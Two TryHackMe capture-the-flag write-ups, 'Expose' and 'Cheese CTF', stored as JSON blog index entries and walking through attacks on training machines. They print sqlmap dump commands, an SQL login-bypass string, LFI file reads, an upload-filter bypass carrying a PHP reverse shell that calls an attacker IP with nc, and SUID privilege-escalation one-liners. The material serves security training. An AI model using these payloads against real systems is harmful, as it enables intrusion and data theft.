[
  
  {
    "title": "TryHackMe | Expose ",
    "url": "/posts/Expose/",
    "categories": "TryHackMe",
    "tags": "thm, ctf, writeup",
    "date": "2025-08-22 03:00:00 +0100",
    "content": "Reconnaissance  for initial reconnaissance i used this nmap command to scan for open ports sudo nmap -sS -sV 10.10.188.185 -p-    we can see that there is a web server on the port 1337 accessing the site with this url http://10.10.188.185:1337 we are met with a basic html page, so we enemurate using ffuf :    we find 2 endpoints, admin and admin_101. when we visit the /admin_101 endpoint we see that the email is already set and in the source code the page actually sends the post request :    so i intercepted a post request and saved it to reqsq.txt and used sqlmap    after a while sqlmap returns that the parameter ‘email’ is vulnrable !    from there we can dump the database using this command sqlmap -r reqsq.txt --batch --level=5 --risk=3 --dump, we get 2 tables : user and config      using the password on the /admin_101 endpoint we get this webpage :    when we use the first url from the config table from earlier and the password associated with it we get this message :    when we view-source for this page we get a hint:    so we try just that, in the url we add ?file= to test the parameter, this will allows us to read files that we have permissions to read so we test with a world readable file like /etc/passwd like this http://10.10.137.122:1337/file1010111/index.php?file=/etc/passwd    and we have an LFI !  using chatgpt we can ask him to retrieve the entries with /home , we get 2 : z*** and ubuntu  now let’s try the second url /upload-cv00101011/index.php for this url we are prompted for the name of the user starting with z, we use the name found from earlier and we get in:    now we can upload a file to the server, checking the source code we can see that there is client side sanitization, and the client will only send files with .png or .jpg extensions, itried double extetion method but it didn’t work. luckily we can use burpsuite to bypass this sanitization, we intercept the post request and in repeater we set the filename to shell.php and we set our reverse shell payload in the content section &lt;?php system(\"mkfifo /tmp/f; nc 10.21.239.111 666 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1\"); ?&gt; and we leave the Content-Type: image/png as is. after sending it we get the message : File uploaded successfully! Maybe look in source code to see the path checking the source code through the burp response or the browser will reveal the url to be /upload_thm_1001    we set our listener and access the file through the browser with the url http://10.10.137.122:1337/upload-cv00101011/upload_thm_1001/shellbwip.php and bwoop! we get a shell !    for the user flag, we access the home directory of our user /home/zeamkish. we can see a .txt file containing his ssh credentials    accessing the machine using ssh we get a shell as zeamkish and from there we can read the flag.txt  root flag  for the root flag, we can look for binaries with SUID bit set which let them execute with root priveleges with this comman find / -type f -perm -04000 -ls 2&gt;/dev/null, we get a long list of which we can see the find binary. with a quick search in https://gtfobins.github.io/ we can escalate to root using this command ./find . -exec /bin/sh -p \\; -quit    "
  },
  
  {
    "title": "TryHackMe | Cheese CTF",
    "url": "/posts/Cheese_CTF/",
    "categories": "TryHackMe",
    "tags": "thm, ctf, writeup",
    "date": "2025-08-20 03:00:00 +0100",
    "content": "Summary  In this room, we leverage an SQL injection exploit to bypass authentication on a login page. Further investigation on the webpage reveals an LFI vulnerability that allows us to achieve RCE via a crafted PHP payload using PHP filters. After obtaining a shell with a system account, we can escalate to user by creating and adding our RSA key to the authorized_keys file of the user comte. To gain the root shell, we have to edit a script that activates a SUID binary, which we can leverage to read and write files.  Reconnaissance  In the reconnaissance phase, I started by using Nmap to enumerate the open ports. After a while, Nmap returned a very long list. We can see that a lot of ports of interest are open, such as HTTP and SSH.      We can access the webpage by visiting http://10.10.15.229:80/.    I tried enumerating folders, but it didn’t lead anywhere.    While browsing the site, we find a login page at http://10.10.15.229:80/login.php.    SQLi Authentication Bypass  I tried testing basic login credentials like admin:admin and admin:Password123, but nothing worked. So, I intercepted a login POST request using Burp Suite and tested it with SQLMap for SQL injection. SQLMap reported that the username parameter appeared to be injectable.      I initially tried to dump the database, which was successful and revealed a single user. However, the password hash associated with the user was uncrackable using online sites like CrackStation and others.    Knowing the username parameter was injectable, I tried some payloads, and eventually this one worked: ' || 1=1;-- -  This allowed us to bypass the authentication process.    LFI and RCE  Visiting the messages section of the site, we see a clickable link that takes us to a page with the message:    If you know, you know :D   Upon further inspection, we realize the URL is using a file parameter along with a filter:  http://10.10.15.229/secret-script.php?file=php://filter/resource=supersecretmessageforadmin  A simple test to try reading a world-readable file turns out to be successful.    We have an LFI!  We can use the convert.base64-encode filter to read the secret-script.php file like so:    To get a reverse shell, we need to use this tool: PHP filter chain generator  We set our Netcat listener and then create and send our payload.    And we have a shell!    User Flag  When we access the user comte’s home directory, we can access the .ssh folder and find an authorized_keys file.    Since the file is writable, we can generate an SSH key and add it to the file to get a shell as comte.      Now we connect via SSH:    Root Flag  When we check the sudo privileges for comte, we see:    The user can reload the configuration files for systemd and start a script called exploit.timer, which in turn starts the service exploit.service. Let’s see the script:    Let’s try running the script:    It won’t run! That’s because the OnBootSec= parameter is empty, which specifies to systemd when to start the timer after reload. Let’s add the missing value and execute the script.    Now, checking for binaries with the SUID bit set reveals a binary called xxd.    Looking it up on GTFOBins, we see that it can be abused to read files. We use it to read the root flag:   "
  }
  
]

